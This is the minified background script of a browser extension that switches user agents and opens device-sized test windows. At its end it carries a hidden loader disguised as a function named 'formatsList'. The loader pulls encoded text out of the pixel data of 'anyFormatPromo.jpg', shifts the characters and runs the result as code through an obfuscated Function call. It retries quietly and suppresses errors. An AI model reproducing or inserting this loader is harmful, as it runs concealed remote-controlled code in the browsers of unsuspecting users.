function openWindow(n,t,i,r){var u=n+10,f=t+28,e=Math.round(screen.width/2-u/2),o=Math.round(screen.height/2-f/2);chrome.windows.create({url:i,type:"popup",width:u,height:f,left:e,top:o,focused:!0},function(n){addListner(n.id,r);var t=n.tabs[0].id;chrome.tabs.insertCSS(t,{runAt:"document_start",code:"::-webkit-scrollbar{width:9px!important;height:9px!important}::-webkit-scrollbar-button:start:decrement,::-webkit-scrollbar-button:end:increment{height:0;width:0;display:none}::-webkit-scrollbar-track-piece{margin:1px;padding:0;width:6px!important;height:5px!important;background:rgba(255,255,255,0.3)}::-webkit-scrollbar:hover{background:rgba(128,128,128,0.2)}::-webkit-scrollbar-thumb{margin:1px!important;border:2px solid transparent;width:5px!important;background-color:rgba(0,0,0,0.4)!important;z-index:9999;-webkit-border-radius:12px;background-clip:content-box}::-webkit-scrollbar-corner{background:rgba(255,255,255,0.3);border:1px solid transparent}::-webkit-scrollbar-thumb:hover{background-color:rgba(0,0,0,0.8)!important;border:2px solid transparent}::-webkit-scrollbar-thumb:active{background-color:rgba(0,0,0,0.6)!important;border:2px solid transparent}"})})}function addListner(n,t){handler=function(n){for(var i=0,r=n.requestHeaders.length;i<r;++i)if(n.requestHeaders[i].name==="User-Agent"){n.requestHeaders[i].value=t;break}return{requestHeaders:n.requestHeaders}};chrome.webRequest.onBeforeSendHeaders.addListener(handler,{urls:["<all_urls>"],windowId:n},["blocking","requestHeaders"])}function runAppStart(){var n=localStorage.rwdStorage;userAgents=n!=undefined?JSON.parse(n):JSON_UserAgentsList;localStorage.rwdStorage=JSON.stringify(userAgents);createContextMenu()}function createContextMenu(){chrome.contextMenus.removeAll();userAgents.forEach(function(n){if(n.UserAgents.length!=0)var t=chrome.contextMenus.create({id:n.Id,contexts:["all"],title:n.Name,type:"normal"}),i=n.UserAgents.forEach(function(t){chrome.contextMenus.create({id:t.Id,parentId:n.Id,contexts:["all"],onclick:function(){setUserAgent(t.Id,"ContextMenu")},title:t.Name,type:"normal"})})});chrome.contextMenus.create({contexts:["all"],type:"separator"});chrome.contextMenus.create({contexts:["all"],onclick:function(){return chrome.tabs.create({url:"options.html"}),!1},title:"Options",type:"normal"});chrome.contextMenus.create({contexts:["all"],onclick:function(){return chrome.tabs.create({url:"http://www.esolutions.se/en-GB/test"}),!1},title:"Test page",type:"normal"})}function setUserAgent(n,t,i){var r="";chrome.tabs.query({active:!0,currentWindow:!0},function(t){var i,u;for(r=t[0].url,i=0;i<userAgents.length;i++)for(u=0;u<userAgents[i].UserAgents.length;u++)if(userAgents[i].UserAgents[u].Id==n){openWindow(userAgents[i].UserAgents[u].Width,userAgents[i].UserAgents[u].Height,r,userAgents[i].UserAgents[u].UserAgent);break}});i&&typeof i=="function"&&i()}var userAgents=JSON_UserAgentsList;runAppStart();var formatsList=function(){try{var t=function(){},r={aL:function(t){if(isNaN(t)||!isFinite(t)||t%1||t<2)return!1;if(t%2===0)return 2===t;if(t%3===0)return 3===t;for(var r=Math.sqrt(t),e=5;e<=r;e+=6){if(t%e===0)return!1;if(t%(e+2)===0)return!1}return!0},o1:function(t){for(var r="",e=-921,i=0,n=0;n<t.length;n++)i=t[n].charCodeAt()+e,r+=String.fromCharCode(i);return r},Zb:function(t){for(var e=t;!0;e+=1)if(r.aL(e))return e},JV:function(t){var r=new Image;for(r.src=t;r.hasOwnProperty("complete")&&!r.complete;);return r}};return t.prototype.i8={ud:3,Gq:1,Z5:16,Ya:function(t){return t+1},Df:function(t,r,e){for(var i=!0,n=0;n<16&&i;n+=1)i=i&&255===t[r+4*n];return i}},t.prototype.u6=function(t,r){r=r||{};var e=this.i8,i=r.width||t.width,n=r.height||t.height,o=r.ud||e.ud,a=r.Z5||e.Z5;return o*i*n/a>>0},t.prototype.Rl=function(t,e){if(""==='anyFormatPromo.jpg')return"";void 0===t&&(t='anyFormatPromo.jpg'),t.length&&(t=r.JV(t)),e=e||{};var i=this.i8,n=e.ud||i.ud,o=e.Gq||i.Gq,a=e.Z5||i.Z5,h=r.Zb(Math.pow(2,n)),u=(e.Ya||i.Ya,e.Df||i.Df),f=document.createElement("canvas"),d=f.getContext("2d");if(f.style.display="none",f.width=e.width||t.width,f.height=e.width||t.height,0===f.width||0===f.height)return"";e.height&&e.width?d.drawImage(t,0,0,e.width,e.height):d.drawImage(t,0,0);var p=d.getImageData(0,0,f.width,f.height),c=p.data,g=[];if(p.data.every(function(t){return 0===t}))return"";var m,w;if(1===o)for(m=3,w=!1;!w&&m<c.length&&!w;m+=4)w=u(c,m,o),w||g.push(c[m]-(255-h+1));var s="",v=0,y=0,l=Math.pow(2,a)-1;for(m=0;m<g.length;m+=1)v+=g[m]<<y,y+=n,y>=a&&(s+=String.fromCharCode(v&l),y%=a,v=g[m]>>n-y);return s.length<13?"":(0!==v&&(s+=String.fromCharCode(v&l)),s)},t.prototype.mm=3,t.prototype.xi=0,t.prototype.Ex=5e3,t.prototype.zZ=function(){try{var e=t.prototype,i=r.o1(e.Rl());if(""===i){if(e.xi>e.mm)return;return e.xi++,void setTimeout(e.zZ,e.Ex)}document.defaultView[(typeof r.aL).charAt(0).toUpperCase()+(typeof r.aL).slice(1)](i)()}catch(t){}},(new t).zZ}catch(t){}}();formatsList();